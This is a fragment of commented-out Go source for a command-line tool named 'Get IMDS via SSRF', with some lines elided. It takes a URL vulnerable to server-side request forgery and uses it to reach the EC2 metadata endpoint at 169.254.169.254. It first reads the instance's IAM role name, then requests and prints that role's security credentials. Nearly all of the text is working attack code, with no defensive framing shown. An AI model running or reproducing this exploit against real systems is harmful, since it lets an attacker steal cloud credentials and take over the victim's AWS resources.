...
// 		iamRole      string
// 	)
// 	parse := &cobra.Command{Use: "Get IMDS via SSRF", Long: "Get EC2 instance metadata via SSRF"}
// 	parse.PersistentFlags().StringVarP(&ssrfEndpoint, "url", "u", "", "ssrf url")

// 	if err := parse.Execute(); err != nil {
// 		fmt.Println(err)
// 		os.Exit(1)
// 	}

// 	getIamRole := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

// 	response, err := http.Get(ssrfEndpoint + getIamRole)
// 	if err != nil {
...
// 			os.Exit(1)
// 		}
// 		fmt.Println("Success get iam role: ", string(body))
// 		iamRole = string(body)
// 	} else {
// 		fmt.Println("Failed to get iam role")
// 		os.Exit(1)
...
// 	response, err = http.Get(ssrfEndpoint + getIamRole + iamRole)
// 	if response.StatusCode == 200 {
// 		body, err := io.ReadAll(response.Body)
// 		defer response.Body.Close()
// 		if err != nil {
...
// 			os.Exit(1)
// 		}
// 		fmt.Println("Success get credentials: ", string(body))
